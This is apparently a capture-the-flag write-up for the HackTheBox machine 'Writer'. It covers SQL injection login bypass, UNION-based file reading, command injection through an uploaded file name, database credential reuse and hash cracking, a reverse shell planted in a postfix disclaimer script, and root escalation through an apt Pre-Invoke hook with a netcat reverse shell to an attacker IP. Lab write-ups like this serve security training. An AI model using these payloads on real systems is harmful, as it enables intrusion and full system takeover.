writer
---

## Steps

1. fuzzing paths and SQL injection

We fuzz for the path `http://writer.htb/administrative` which gives us an admin login page

The username is vulnerable to SQL injection `admin' or 1=1;`

2. SQL injection union and LFI

We find out how many columns there are by playing with the number until we get no errors

`admin' order by N;`

Once we have found N

`admin' UNION ALL SELECT 1,load_file('/etc/passwd'),3,4,5,6`

We can lfi `/etc/apache2/sites-enabled/000-default.conf`, and follow more files until we lfi `/var/www/writer.htb/writer/__init__.py`, which shows us how images are processed

3. RCE and reverse shell

In the `__init__.py` file, we see that they simply check if the string `.jpg` exists in the file name uploaded, before calling `os.system("mv <file> ...)`

If we name our file to be `a.jpg;<exploit code>`, we can trigger rce

We use BurpSuite to intercept the POST request on changing images, and we modify the contents of the file being sent to achieve RCE

`a.jpg;echo <base64 reverse shell> | base64 -d | bash`

This should call a reverse shell

4. Kyle

```
$ cat /etc/mysql/my.cnf

$ mysql -u djangouser dev -p
$ DjangoSuperPassword

$ select username,password from auth_user;

kyle, password hash

$ hashcat64 hash.txr rockyou.txt

marcoantonio

$ ssh kyle@10.10.11.110
marcoantonio
```


5. Disclaimer and Emailing

```
$ id

... (management)

$ find / -group management 2>/dev/null
/etc/postfix/Disclaimer
```

Disclaimer is called everytime someone recieves an email

Put a reverse shell code in Disclaimer, and send an emaili using Python SMTP to john

```
import smtplib
host = '127.0.0.1'
port = 25

sender_email = "kyle@writer.htb"
receiver_email = "john@localhost"
message = """\
Subject: Hi there

Test_python_sender."""

try:
    server = smtplib.SMTP(host, port)
    server.ehlo()
    server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    print(e)
finally:
    server.quit()
```

When john receives the email, he will execute Disclaimer using his account, triggering the reverse shell

Get the user flag

## Root Flag

We can write to `/etc/apt/apt.conf.d/` which is a collection of scripts that is called when `apt` is called

We write a reverse shell in to get a root shell

```
$ find / -perms /u=s 2>/dev/null


$ id
... (filter)

$ find / -groups filter 2>/dev/null
/etc/apt/apt.conf.d/


$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f"};' > exploit
```
